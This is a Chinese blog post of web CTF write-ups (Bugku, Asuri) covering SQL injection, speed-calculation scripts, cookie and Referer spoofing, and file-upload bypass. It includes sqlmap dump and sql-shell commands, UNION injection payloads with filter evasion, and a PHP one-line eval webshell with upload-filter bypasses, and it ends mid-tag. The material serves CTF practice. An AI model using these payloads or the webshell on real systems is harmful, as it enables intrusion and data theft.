{"title":"ctf-web-WriteUp-2-Asuri-Bugku","date":"2020-02-10T06:39:32.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"thumbnail":"https://s2.ax1x.com/2020/01/19/1PCcTK.jpg","link":"2020/02/10/ctf-web-WriteUp-2-Asuri-Bugku","comments":true,"tags":["ctf","web"],"categories":["Programming"],"updated":"2020-05-29T15:22:56.635Z","content":"<h4 id=\"成绩单\">成绩单<a href=\"#成绩单\" title=\"成绩单\"></a></h4><blockquote>\n<p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。    —— <a href=\"https://baike.baidu.com/item/sql注入/150289?fr=aladdin\" target=\"_blank\">[百度百科]</a></p>\n</blockquote>\n<p>网页链接存在参数传递，后台并没有对用户的输入进行过滤，导致用户的输入直接被 SQL 解释器执行。<strong>SQL 注入的产生条件</strong>：</p>\n<ul><li>有参数传递</li><li>参数值带入数据库查询并且执行</li></ul><p>基础知识：<a href=\"https://blog.csdn.net/song_lee/article/details/80971459\" target=\"_blank\"><a href=\"https://blog.csdn.net/song_lee/article/details/80971459\" target=\"_blank\">https://blog.csdn.net/song_lee/article/details/80971459</a></a></p>\n<p><a href=\"https://blog.csdn.net/qq_33530840/article/details/82144515\" target=\"_blank\"><a href=\"https://blog.csdn.net/qq_33530840/article/details/82144515\" target=\"_blank\">https://blog.csdn.net/qq_33530840/article/details/82144515</a></a></p>\n<p>当我们不知道数据库名，表名字段名时，需要去爆库，原理其实就是 MySQL 版本大于 5.0 时，有个默认数据库 information_schema，里面存放着所有数据库的信息 (比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询，爆表爆列。</p>\n<p>爆库的标准姿势：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata;     //猜数据库</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">'xxxxx'</span>;     //猜某数据库的数据表</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Select</span> column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'xxxxx'</span>;     //猜某表的字段名</span><br></pre></td></tr></table></figure>\n\n<p>这里可以从 post 数据包中注入，输入1号，用burpsuite抓包，点击 action——&gt;  copy to file。</p>\n<p>保存文件后打开sqlmap（我用的是虚拟机的），输入</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r “/home/yuyu/桌面/ctf/题目/list2.txt” -p id <span class=\"comment\">--current-db</span></span><br></pre></td></tr></table></figure>\n\n<!-- new line -->\n\n<p><img src=\"https://s2.ax1x.com/2020/02/10/15kJSK.png\" class=\"φcy\" alt=\"2.png\"></p>\n<!-- new line -->\n\n<p>得到当前使用数据库名字<code>skctf_flag</code>。爆表</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r \"/home/yuyu/桌面/ctf/题目/list2.txt\" -p id <span class=\"comment\">--table -D \"skctf_flag</span></span><br></pre></td></tr></table></figure>\n\n<!-- new line -->\n\n<p><img src=\"https://s2.ax1x.com/2020/02/10/15krfP.png\" class=\"φcy\" alt=\"3.png\"></p>\n<!-- new line -->\n\n<p>爆 f14g 的列的时候找不到column，f14g这里的东西被删了，继续不下去了。</p>\n<p>网上还有几种别的方法，一是手动注入：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆表：-1&#39; union select 1,table_name,3,4 from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;skctf_flag&#39; LIMIT 0,1</span><br><span class=\"line\">爆字段：-1&#39; union select 1,column_name,3,4 from information_schema.columns where TABLE_SCHEMA&#x3D;&#39;skctf_flag&#39; and table_name&#x3D;&#39;fl4g&#39; LIMIT 0,1#</span><br><span class=\"line\">爆 flag：-1&#39; union select 1,skctf_flag,3,4 from fl4g#</span><br></pre></td></tr></table></figure>\n\n<p>二是不抓包，拿到shell，</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 sqlmap.py -u http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php --data &quot;id&#x3D;1&quot; --sql-shell</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>一些常用使用命令</p>\n</blockquote>\n<p><strong>1、是否能注入</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>2、获取所有的数据库</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>\n\n<p><strong>3、当前库</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>\n\n<p><strong>4、查询某数据库的所有表（比如 security）</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;  -D security --tables</span><br></pre></td></tr></table></figure>\n\n<p><strong>5、暴力查询所有的表</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   --tables</span><br></pre></td></tr></table></figure>\n\n<p><strong>6、列出 security 库中 users 表中的所有列</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   -D security -T users --columns</span><br></pre></td></tr></table></figure>\n\n<p>(-D dbname 指定数据库名称、-T tablename：指定某数据表的名称、—columns：列出指定表上的所有列)</p>\n<p><strong>7、导出三个数据列中所有的数据</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;   -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure>\n\n<p><strong>8、提供一个 sql shell</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --sql-shell</span><br></pre></td></tr></table></figure>\n\n<p><strong>POST 请求</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http:&#x2F;&#x2F;114.55.36.69:8010&#x2F; --date &quot;word&#x3D;1&amp;number&#x3D;5&quot; --dbs</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"秋名山老司机（bugku）amp-快速计算（asuri）\">秋名山老司机（bugku）&amp; 快速计算（Asuri）<a href=\"#秋名山老司机（bugku）amp-快速计算（asuri）\" title=\"秋名山老司机（bugku）&amp; 快速计算（Asuri）\"></a></h4><p>两道题都是快速计算，需要写脚本，不完全一样。</p>\n<p>秋名山老司机没有输入框，直接post</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">s = requests.Session()</span><br><span class=\"line\">r = s.get(<span class=\"string\">\"http://123.206.87.240:8002/qiumingshan/\"</span>)</span><br><span class=\"line\">searchObj = re.search(<span class=\"string\">r'^&lt;div&gt;(.*)=\\?;&lt;/div&gt;$'</span>, r.text, re.M | re.S)</span><br><span class=\"line\">d = &#123;</span><br><span class=\"line\"><span class=\"string\">\"value\"</span>: eval(searchObj.group(<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = s.post(<span class=\"string\">\"http://123.206.87.240:8002/qiumingshan/\"</span>, data=d)</span><br><span class=\"line\">print(r.text)</span><br></pre></td></tr></table></figure>\n\n<p>不知道value咋来的，题目有问题</p>\n<p>Asuri上这道很清晰，有输入框和<code>submit</code>，返回值的<code>name</code>是<code>answer</code>，中间用<code>eval()</code>函数计算正则分割出来的表达式。新的post要传    <code>headers</code>，不然题目答案服务器对不上号。python程序直接运行即可返回flag。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">s = requests.Session()</span><br><span class=\"line\">r = s.get(<span class=\"string\">\"http://47.102.107.100:39010/\"</span>)</span><br><span class=\"line\">print(re.findall(<span class=\"string\">\"&lt;hr&gt;(.*?)&lt;hr&gt;\"</span>,r.text)[<span class=\"number\">0</span>])</span><br><span class=\"line\">d = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"answer\"</span>: eval(re.findall(<span class=\"string\">\"&lt;hr&gt;(.*?)&lt;hr&gt;\"</span>,r.text)[<span class=\"number\">0</span>])</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r = s.post(<span class=\"string\">\"http://47.102.107.100:39010/\"</span>, data=d, headers=s.cookies)</span><br><span class=\"line\">print(r.text)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"速度要快（bugku）\">速度要快（bugku）<a href=\"#速度要快（bugku）\" title=\"速度要快（bugku）\"></a></h4><p>查看源代码, Elements中有提示<code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code>，要把发现的信息通过margin这个参数post过去，margin是css属性，设置一个元素所有外边距的宽度，或者设置各边上外边距的宽度。</p>\n<p>点击 Network, 查看相关网络请求信息，headers里有一条flag，并且是用base64编码的，但是发现按F5刷新flag总是会变。</p>\n<!-- new line -->\n\n<p><img src=\"https://s2.ax1x.com/2020/02/10/15k4kn.png\" class=\"φcy\" alt=\"4.png\"></p>\n<!-- new line -->\n\n<p>将flag的内容base64解密两次，得到一串数字。解决办法是写脚本，</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">s=requests.session()</span><br><span class=\"line\"><span class=\"comment\">#requests库的session会话对象可以跨请求保持某些参数</span></span><br><span class=\"line\">r=s.get(<span class=\"string\">\"http://123.206.87.240:8002/web6/\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># print(r.headers)</span></span><br><span class=\"line\"><span class=\"comment\">#flag在header里</span></span><br><span class=\"line\">aaa=r.headers[<span class=\"string\">'flag'</span>]</span><br><span class=\"line\">flag=base64.b64decode(r.headers[<span class=\"string\">'flag'</span>]).decode().split(<span class=\"string\">\": \"</span>)[<span class=\"number\">-1</span>]</span><br><span class=\"line\"><span class=\"comment\">#base64解密</span></span><br><span class=\"line\"><span class=\"comment\"># print(flag)</span></span><br><span class=\"line\">flag1=base64.b64decode(flag).decode()</span><br><span class=\"line\"><span class=\"comment\">#base64再解密</span></span><br><span class=\"line\"><span class=\"comment\"># print(flag1)</span></span><br><span class=\"line\">dic=&#123;<span class=\"string\">\"margin\"</span>:flag1&#125;</span><br><span class=\"line\">tr=s.post(<span class=\"string\">\"http://123.206.87.240:8002/web6/\"</span>,data=dic)</span><br><span class=\"line\"><span class=\"comment\">#post参数</span></span><br><span class=\"line\">print(tr.text)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"cookies欺骗（bugku）\">cookies欺骗（bugku）<a href=\"#cookies欺骗（bugku）\" title=\"cookies欺骗（bugku）\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8002/web11/\" target=\"_blank\">http://123.206.87.240:8002/web11/</a></p>\n<p>打开链接是一串很长很长不知道是什么的字符，发现链接变成了<a href=\"http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=\" target=\"_blank\">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>\n<p>后面filename是base64编码的，解码后是<code>keys.txt</code>，但用keys.txt替换后网页没有内容。给line赋值也无济于事。</p>\n<p>将index.php也用base64编码，构造url<a href=\"http://123.206.87.240:8002/web11/index.php?line=&filename=aW5kZXgucGhw\" target=\"_blank\">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</a>，但是也没有东西。</p>\n<p>给line赋值1，2，3都能显示不同的代码，于是写一个脚本获得index.php</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">a=<span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(a):</span><br><span class=\"line\">    url=<span class=\"string\">\"http://123.206.87.240:8002/web11/index.php?line=\"</span>+str(i)+<span class=\"string\">\"&amp;filename=aW5kZXgucGhw\"</span></span><br><span class=\"line\">    s=requests.get(url)    </span><br><span class=\"line\">    print(s.text)</span><br></pre></td></tr></table></figure>\n\n<p>得到index.php</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">$file=base64_decode(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'filename'</span>])?$_GET[<span class=\"string\">'filename'</span>]:<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">$line=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'line'</span>])?intval($_GET[<span class=\"string\">'line'</span>]):<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($file==<span class=\"string\">''</span>) header(<span class=\"string\">\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\"</span>);</span><br><span class=\"line\">$file_list = <span class=\"keyword\">array</span>(</span><br><span class=\"line\"><span class=\"string\">'0'</span> =&gt;<span class=\"string\">'keys.txt'</span>,</span><br><span class=\"line\"><span class=\"string\">'1'</span> =&gt;<span class=\"string\">'index.php'</span>,</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'margin'</span>]) &amp;&amp; $_COOKIE[<span class=\"string\">'margin'</span>]==<span class=\"string\">'margin'</span>)&#123;</span><br><span class=\"line\">$file_list[<span class=\"number\">2</span>]=<span class=\"string\">'keys.php'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(in_array($file, $file_list))&#123;</span><br><span class=\"line\">$fa = file($file);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $fa[$line];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析源码，前面判断传参，后面判断 cookie 必须满足 margin=margin 才能访问 keys.php，keys.php也要base64编码。</p>\n<!-- new line -->\n\n<p><img src=\"https://s2.ax1x.com/2020/02/10/15kH6U.png\" class=\"φcy\" alt=\"https://github.com/yuyuoo/yuyuoo.github.io/raw/master/2019/10/13/ctf-web-WriteUp-2-Asuri-Bugku/5.png\"><!-- new line --></p>\n<h4 id=\"never-give-up（bugku）\">never give up（bugku）<a href=\"#never-give-up（bugku）\" title=\"never give up（bugku）\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8006/test/hello.php\" target=\"_blank\">http://123.206.87.240:8006/test/hello.php</a></p>\n<p>查看网页源代码，发现了 1p.html，访问<code>view-source:123.206.87.240:8006/test/1p.html</code></p>\n<p><img src=\"https://i.loli.net/2020/05/26/vJEtGeMCpscdhS3.jpg\" class=\"φcy\" alt=\"never give up1.jpg\"></p>\n<p>将<code>var Words</code>先base64解码，再根据提示unescape，得到代码如下：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\";if(!$_GET['id'])</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\theader('Location: hello.php?id=1');</span></span><br><span class=\"line\"><span class=\"string\">\texit();</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">$id=$_GET['id'];</span></span><br><span class=\"line\"><span class=\"string\">$a=$_GET['a'];</span></span><br><span class=\"line\"><span class=\"string\">$b=$_GET['b'];</span></span><br><span class=\"line\"><span class=\"string\">if(stripos($a,'.'))</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\techo 'no no no no no no no';</span></span><br><span class=\"line\"><span class=\"string\">\treturn ;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">$data = @file_get_contents($a,'r');</span></span><br><span class=\"line\"><span class=\"string\">if($data==\"</span>bugku is a nice plateform!<span class=\"string\">\" and $id==0 and strlen($b)&gt;5 and eregi(\"</span><span class=\"number\">111</span><span class=\"string\">\".substr($b,0,1),\"</span><span class=\"number\">1114</span><span class=\"string\">\") and substr($b,0,1)!=4)</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\trequire(\"</span>f4l2a3g.txt<span class=\"string\">\");</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">else</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">\tprint \"</span>never never never give up !!!<span class=\"string\">\";</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>进入url<code>http://123.206.87.240:8006/test/f4l2a3g.txt</code>，可以得到flag。</p>\n<h4 id=\"你从哪里来bugku\">你从哪里来(bugku)<a href=\"#你从哪里来bugku\" title=\"你从哪里来(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:9009/from.php\" target=\"_blank\">http://123.206.87.240:9009/from.php</a></p>\n<p>打开只有一句话：<code>are you from google?</code></p>\n<p>方法是修改 http referer 头</p>\n<blockquote>\n<p>HTTP_REFERER 编辑</p>\n<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>\n</blockquote>\n<p>抓包后send to Repeater，添加referer，点击go得到flag</p>\n<p><img src=\"https://i.loli.net/2020/05/26/QiW4kCZaAPf5Rq6.jpg\" class=\"φcy\" alt=\"你从哪里来\"></p>\n<h4 id=\"各种绕过bugku\">各种绕过(bugku)<a href=\"#各种绕过bugku\" title=\"各种绕过(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8002/web7/\" target=\"_blank\">http://123.206.87.240:8002/web7/</a></p>\n<p>要求uname不等于passwd，并且uname和passwd的sha1散列值相等，当uname和passwd是数组时即可绕过</p>\n<p><img src=\"https://i.loli.net/2020/05/27/oiDAOhRVHrWvsdY.jpg\" class=\"φcy\" alt=\"https://i.loli.net/2020/05/27/oiDAOhRVHrWvsdY.jpg\"></p>\n<h4 id=\"web8bugku\">web8(bugku)<a href=\"#web8bugku\" title=\"web8(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8002/web8/\" target=\"_blank\">http://123.206.87.240:8002/web8/</a></p>\n<p>比较ac和fn这个文件的内容是否相等</p>\n<p>根据题目提示，构造url<a href=\"http://123.206.87.240:8002/web8/flag.txt，看到\" target=\"_blank\">http://123.206.87.240:8002/web8/flag.txt，看到</a></p>\n<p><img src=\"https://i.loli.net/2020/05/27/AsLMlbwHBWN2rKT.jpg\" class=\"φcy\" alt=\"https://i.loli.net/2020/05/27/AsLMlbwHBWN2rKT.jpg\"></p>\n<p>这是flag.txt的内容，也就是ac的值，fn自然就是flag.txt，所以构造url<a href=\"http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt得到flag。\" target=\"_blank\">http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt得到flag。</a></p>\n<h4 id=\"求-getshellbugku\">求 getshell(bugku)<a href=\"#求-getshellbugku\" title=\"求 getshell(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8002/web9/index.php\" target=\"_blank\">http://123.206.87.240:8002/web9/index.php</a></p>\n<p>要image文件不要php，上传一句话木马</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>($_POST[<span class=\"string\">'pass'</span>]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ol><li>点击submit后，在burpsuite中尝试修改文件后缀名为<code>php2, php3, php4, php5, phps, pht, phtm, phtml</code>（php 的别名），这题只有<code>php5</code>可以。</li><li>因为服务端检测的是文件的 MIME 类型，而对这个 MIME 类型的的值的获取是通过 HTTP 请求字段里的 <code>Content-Type</code> 字段 ，所以绕过的方法就是通过修改 Content-Type 的值，比如修改为 <code>image/jpeg</code>；<code>image/png</code>；<code>image/gif</code>等等允许上传类型对应的 MIME 值</li><li>请求头里的<code>Content-Type</code> 字段，进行大小写绕过，也就是把<code>multipart/form-data</code> 中任意一个字母改成大写</li></ol><p><img src=\"https://i.loli.net/2020/05/28/i1JScUrxTWfOvPy.jpg\" class=\"φcy\" alt=\"https://i.loli.net/2020/05/28/i1JScUrxTWfOvPy.jpg\"></p>\n<p>这里用到的<a href=\"https://www.cnblogs.com/-chenxs/p/12324425.html\" target=\"_blank\">WAF 的基础绕过</a>，向 web 服务器发送畸形请求，也就是并非这个标准的 HTTP 数据包的时候，由于 web 服务器的一些兼容性的特性，会尽力解析这些畸形的数据包。</p>\n<p>关于一句话木马：<a href=\"https://blog.csdn.net/weixin_39190897/article/details/86772765\" target=\"_blank\">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>\n<p>关于文件上传限制绕过：<a href=\"https://www.cnblogs.com/askta0/p/9190556.html\" target=\"_blank\">https://www.cnblogs.com/askta0/p/9190556.html</a></p>\n<h4 id=\"多次bugku\">多次(bugku)<a href=\"#多次bugku\" title=\"多次(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:9004/\" target=\"_blank\">http://123.206.87.240:9004</a></p>\n<p>点进去之后看到url是<a href=\"http://123.206.87.240:9004/1ndex.php?id=1\" target=\"_blank\">http://123.206.87.240:9004/1ndex.php?id=1</a></p>\n<p>猜测要运用sql注入。并且把id的值改成2，3……每次页面显示的结果都不一样，改到5页面直接提示要用sql注入了。</p>\n<p>修改url后半部分为<code>?id=1&#39;and1=1--+</code>，页面也显示ERROR，双写and，改成<code>?id=1&#39;anandd 1=1--+</code>就不报错，说明and被过滤掉了。</p>\n<p>这里就要用到<strong>异或注入</strong>，异或是两个条件相同（同真或同假）时为假</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39;^(length(&#39;union&#39;)!&#x3D;0)--+</span><br></pre></td></tr></table></figure>\n\n<p>如果返回页面显示正常，那就证明 length (‘union’)==0 的，也就是 union 被过滤了，同理测试出被过滤的字符串有：and，or，union，select，都用双写来绕过。</p>\n<p>具体过程参考上面“成绩单”，爆表：这里information里也有<code>or</code></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>\n\n<p>页面显示<code>flag1,hint</code></p>\n<p>爆字段：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;&#39;flag1&#39;--+</span><br></pre></td></tr></table></figure>\n\n<p>页面显示<code>flag1,address</code></p>\n<p>爆数据：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(flag1) from flag1--+</span><br></pre></td></tr></table></figure>\n\n<p>页面显示<code>usOwycTju+FTUUzXosjr</code>，以为是flag，结果提交不对。</p>\n<p>把上一条爆数据改成</p>\n<figure class=\"highlight\"><table><tr><td 